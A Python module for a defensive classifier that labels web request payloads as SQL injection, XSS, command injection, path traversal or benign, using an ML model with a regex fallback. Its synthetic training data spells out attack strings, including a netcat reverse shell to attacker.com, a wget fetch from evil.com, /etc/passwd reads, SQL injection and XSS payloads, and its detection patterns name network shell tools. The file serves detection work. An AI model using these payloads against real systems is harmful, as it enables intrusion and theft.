"""
Stage 3: Payload Classifier - ML model for classifying attack payloads
Classifies payloads into: sql_injection, xss, rce, lfi, benign
"""
import json
import os
import re
from typing import Dict, List, Tuple
import numpy as np
from datetime import datetime

# Try importing ML libraries
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.preprocessing import LabelEncoder
    import joblib
    SKLEARN_AVAILABLE = True
except ImportError:
    print("[WARNING] scikit-learn not installed. Install with: pip install scikit-learn")
    SKLEARN_AVAILABLE = False

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

from shared.utils.logging import get_logger
from shared.utils.metrics import EVIDENCE_OPERATIONS

logger = get_logger(__name__)


class PayloadClassifier:
    """
    Payload classifier using ML (RandomForest + TF-IDF for MVP)
    
    In production: replace with fine-tuned transformer (DistilBERT/RoBERTa)
    or ONNX-exported model for performance
    """
    
    ATTACK_CLASSES = [
        "benign",
        "sql_injection",
        "xss",
        "command_injection",
        "path_traversal",
        "xxe",
        "csrf"
    ]
    
    def __init__(self, model_path: str = None):
        self.model_path = model_path or os.path.join(
            os.path.dirname(__file__), '..', '..', 'data', 'models', 'payload_classifier.pkl'
        )
        
        if SKLEARN_AVAILABLE:
            self.vectorizer = TfidfVectorizer(
                max_features=5000,
                ngram_range=(1, 3),
                analyzer='char_wb',
                min_df=1
            )
            self.label_encoder = LabelEncoder()
            self.label_encoder.fit(self.ATTACK_CLASSES)
            self.model = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            self.is_trained = False
            
            # Try loading existing model
            self._load_model()
        else:
            logger.warning("scikit-learn not available. Using rule-based classification only.")
            self.model = None
        
        logger.info("Payload classifier initialized")
    
    def predict(self, payload: str, context: Dict = None) -> Dict:
        """
        Predict attack class and confidence for a payload
        
        Args:
            payload: Raw payload string
            context: Optional context (param name, path, method)
            
        Returns:
            {
                "class": "sql_injection",
                "confidence": 0.95,
                "probabilities": {"sql_injection": 0.95, "xss": 0.03, ...}
            }
        """
        try:
            # If model available and trained, use it
            if SKLEARN_AVAILABLE and self.is_trained:
                return self._ml_predict(payload, context)
            
            # Fallback to rule-based classification
            return self._rule_based_predict(payload, context)
        
        except Exception as e:
            logger.error(f"Error predicting payload class: {e}", exc_info=True)
            return {"class": "benign", "confidence": 0.0, "probabilities": {}}
    
    def _ml_predict(self, payload: str, context: Dict = None) -> Dict:
        """ML-based prediction"""
        try:
            # Vectorize payload
            X = self.vectorizer.transform([payload])
            
            # Predict probabilities
            proba = self.model.predict_proba(X)[0]
            
            # Get predicted class
            pred_idx = np.argmax(proba)
            pred_class = self.label_encoder.inverse_transform([pred_idx])[0]
            confidence = proba[pred_idx]
            
            # Build probabilities dict
            probabilities = {
                cls: float(proba[i])
                for i, cls in enumerate(self.label_encoder.classes_)
            }
            
            logger.info(f"ML prediction: {pred_class} (confidence={confidence:.2f})")
            
            return {
                "class": pred_class,
                "confidence": float(confidence),
                "probabilities": probabilities,
                "method": "ml"
            }
        
        except Exception as e:
            logger.error(f"ML prediction failed: {e}")
            return self._rule_based_predict(payload, context)
    
    def _rule_based_predict(self, payload: str, context: Dict = None) -> Dict:
        """
        Rule-based classification fallback
        Uses regex patterns and heuristics
        """
        payload_lower = payload.lower()
        payload_upper = payload.upper()
        
        scores = {cls: 0.0 for cls in self.ATTACK_CLASSES}
        
        # SQL Injection patterns
        sql_patterns = [
            (r"'.*OR.*'.*=.*'", 0.9),
            (r"UNION\s+SELECT", 0.95),
            (r";\s*(DROP|DELETE|INSERT|UPDATE)", 0.95),
            (r"--\s*$", 0.7),
            (r"/\*.*\*/", 0.6),
            (r"'.*\+.*'", 0.6),
            (r"(SELECT|INSERT|UPDATE|DELETE|DROP).*FROM", 0.85)
        ]
        
        for pattern, weight in sql_patterns:
            if re.search(pattern, payload_upper, re.IGNORECASE):
                scores["sql_injection"] += weight
        
        # XSS patterns
        xss_patterns = [
            (r"<script[^>]*>", 0.95),
            (r"javascript:", 0.9),
            (r"on\w+\s*=", 0.85),
            (r"<iframe", 0.9),
            (r"<object", 0.8),
            (r"eval\(", 0.85),
            (r"document\.cookie", 0.9)
        ]
        
        for pattern, weight in xss_patterns:
            if re.search(pattern, payload_lower):
                scores["xss"] += weight
        
        # Command Injection patterns
        cmd_patterns = [
            (r"[;&|]\s*(cat|ls|whoami|wget|curl|bash)", 0.9),
            (r"\$\(.*?\)", 0.85),
            (r"`.*?`", 0.85),
            (r"\|\s*(nc|netcat)", 0.95)
        ]
        
        for pattern, weight in cmd_patterns:
            if re.search(pattern, payload_lower):
                scores["command_injection"] += weight
        
        # Path Traversal patterns
        path_patterns = [
            (r"\.\./|\.\.\\", 0.9),
            (r"%2e%2e[/\\]", 0.95),
            (r"\.\.;", 0.85)
        ]
        
        for pattern, weight in path_patterns:
            if re.search(pattern, payload_lower):
                scores["path_traversal"] += weight
        
        # XXE patterns
        xxe_patterns = [
            (r"<!DOCTYPE.*\[<!ENTITY", 0.95),
            (r"<!ENTITY.*SYSTEM", 0.9)
        ]
        
        for pattern, weight in xxe_patterns:
            if re.search(pattern, payload_upper):
                scores["xxe"] += weight
        
        # Normalize scores to probabilities
        max_score = max(scores.values())
        
        if max_score == 0:
            # No patterns matched - likely benign
            return {
                "class": "benign",
                "confidence": 0.8,
                "probabilities": {"benign": 0.8},
                "method": "rule_based"
            }
        
        # Normalize
        total = sum(scores.values())
        probabilities = {cls: score / total for cls, score in scores.items() if score > 0}
        
        # Get top prediction
        pred_class = max(probabilities, key=probabilities.get)
        confidence = min(probabilities[pred_class], 0.99)  # Cap at 0.99 for rule-based
        
        logger.info(f"Rule-based prediction: {pred_class} (confidence={confidence:.2f})")
        
        return {
            "class": pred_class,
            "confidence": float(confidence),
            "probabilities": probabilities,
            "method": "rule_based"
        }
    
    def train(self, training_data: List[Tuple[str, str]]):
        """
        Train the classifier on labeled data
        
        Args:
            training_data: List of (payload, label) tuples
        """
        if not SKLEARN_AVAILABLE:
            logger.error("Cannot train: scikit-learn not available")
            return
        
        if len(training_data) < 10:
            logger.warning(f"Training data too small: {len(training_data)} samples")
            return
        
        try:
            logger.info(f"Training payload classifier on {len(training_data)} samples...")
            
            payloads, labels = zip(*training_data)
            
            # Fit vectorizer
            X = self.vectorizer.fit_transform(payloads)
            
            # Encode labels
            y = self.label_encoder.transform(labels)
            
            # Train model
            self.model.fit(X, y)
            self.is_trained = True
            
            # Save model
            self._save_model()
            
            logger.info("Payload classifier training complete")
        
        except Exception as e:
            logger.error(f"Error training classifier: {e}", exc_info=True)
    
    def _save_model(self):
        """Save trained model to disk"""
        try:
            model_dir = os.path.dirname(self.model_path)
            os.makedirs(model_dir, exist_ok=True)
            
            model_data = {
                "vectorizer": self.vectorizer,
                "label_encoder": self.label_encoder,
                "model": self.model,
                "trained_at": datetime.utcnow().isoformat()
            }
            
            joblib.dump(model_data, self.model_path)
            logger.info(f"Model saved to {self.model_path}")
        
        except Exception as e:
            logger.error(f"Error saving model: {e}", exc_info=True)
    
    def _load_model(self):
        """Load trained model from disk"""
        try:
            if not os.path.exists(self.model_path):
                logger.info("No saved model found. Using untrained model.")
                return
            
            model_data = joblib.load(self.model_path)
            self.vectorizer = model_data["vectorizer"]
            self.label_encoder = model_data["label_encoder"]
            self.model = model_data["model"]
            self.is_trained = True
            
            logger.info(f"Model loaded from {self.model_path}")
        
        except Exception as e:
            logger.warning(f"Could not load model: {e}")
            self.is_trained = False


def generate_synthetic_training_data() -> List[Tuple[str, str]]:
    """
    Generate synthetic training data for MVP
    In production: use real labeled attack dataset
    """
    training_data = []
    
    # SQL Injection examples
    sql_samples = [
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1; DROP TABLE users",
        "1' AND '1'='1",
        "' OR 1=1--",
        "admin' OR '1'='1'--",
        "1' UNION SELECT null,null,null--"
    ]
    training_data.extend([(s, "sql_injection") for s in sql_samples])
    
    # XSS examples
    xss_samples = [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//'"
    ]
    training_data.extend([(s, "xss") for s in xss_samples])
    
    # Command Injection examples
    cmd_samples = [
        "; cat /etc/passwd",
        "| whoami",
        "&& ls -la",
        "$(cat /etc/passwd)",
        "`whoami`",
        "; nc -e /bin/sh attacker.com 4444",
        "| wget http://evil.com/shell.sh"
    ]
    training_data.extend([(s, "command_injection") for s in cmd_samples])
    
    # Path Traversal examples
    path_samples = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2f",
        "....//....//",
        "..//..//..//etc/passwd"
    ]
    training_data.extend([(s, "path_traversal") for s in path_samples])
    
    # Benign examples
    benign_samples = [
        "john@example.com",
        "search query",
        "product name",
        "user123",
        "Hello World",
        "12345",
        "https://example.com",
        "normal text input"
    ]
    training_data.extend([(s, "benign") for s in benign_samples])
    
    return training_data


# CLI entry point
if __name__ == "__main__":
    classifier = PayloadClassifier()
    
    # Train on synthetic data
    training_data = generate_synthetic_training_data()
    classifier.train(training_data)
    
    # Test predictions
    test_payloads = [
        "1' OR '1'='1--",
        "<script>alert(1)</script>",
        "; cat /etc/passwd",
        "../../../etc/passwd",
        "normal user input"
    ]
    
    print("\n=== Test Predictions ===\n")
    for payload in test_payloads:
        result = classifier.predict(payload)
        print(f"Payload: {payload}")
        print(f"Class: {result['class']} (confidence: {result['confidence']:.2f})")
        print(f"Method: {result['method']}")
        print()
